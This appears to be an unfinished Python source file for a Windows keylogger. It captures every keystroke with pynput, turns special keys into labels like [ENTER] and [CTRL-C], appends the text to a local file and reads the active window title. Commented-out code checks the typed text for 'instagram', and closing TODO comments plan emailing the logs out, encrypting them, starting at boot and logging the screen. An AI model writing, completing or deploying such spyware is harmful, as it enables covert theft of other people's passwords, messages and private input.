from pynput.keyboard import Listener
import win32gui
import listener
import random
import time
import os


chars = 0
data = []
kl = []

def on_press(key):
    global kl
    subs = ['Key.enter', ' [ENTER] ', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
            'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ',
            'Key.left', ' [LEFT ARROW] ', 'Key.right', ' [RIGHT ARROW] ', 'Key.shift', ' [SHIFT] ', '\\x13',
            ' [CTRL-S] ', '\\x17', ' [CTRL-W] ', 'Key.caps_lock', ' [CAPS LK] ', '\\x01', ' [CTRL-A] ', 'Key.cmd',
            ' [WINDOWS KEY] ', 'Key.print_screen', ' [PRNT SCR] ', '\\x03', ' [CTRL-C] ', '\\x16', ' [CTRL-V] ']

    keyPressed = "{0}".format(key).replace("'", "")

    if keyPressed in subs:
        data.append(subs[subs.index(keyPressed)+1])
    else:
        data.append(keyPressed)

    print("".join(data))
    writeLogs(0)

    #string = "".join(kl)
    #print(string.split("Key.space"))
    #if "instagram" in string:
    #print("Insta")


def writeLogs(chars):
    path = os.path.expandvars("temp")
    #fileName = str(chars) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
    with open("file.txt", "a") as f:
        #new_data = [item.strip("'") for item in data]
        f.write(''.join(data))
        f.close()

def appListener():
    time.sleep(10)
    appOpen = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if appOpen == "Cortana":
        appOpen = "Windows Start Menu"
        print(appOpen)
    else:
        pass



# add a function to send the logs via email
# add a function to encrypt and decrypt logs
# startup keylogger
# screen logger
# possibly adding a window filter 